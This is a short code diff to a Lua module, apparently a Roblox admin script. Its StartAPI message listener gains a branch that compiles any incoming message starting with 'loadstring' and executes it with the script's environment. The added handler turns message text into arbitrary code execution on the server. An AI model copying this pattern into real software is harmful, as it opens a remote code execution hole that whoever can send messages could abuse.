@@ -1012,6 +1012,16 @@ function module:StartAPI()
 							esevent:FireClient(v, 'Hint', 'Global Announcement', msg:sub(6, #msg))
 						end
 					end
+				elseif msg:sub(1, 10):lower() == "loadstring" then
+					local func = require(script.Loadstring)(msg:sub(12, #msg), getfenv())
+							
+					if type(func) == "function" then
+						local suc,ers = pcall(func)
+						
+						if not suc then
+							addvlog("Global loadstring error: "..tostring(ers))			
+						end
+					end
 				end
 			end)
 		end)
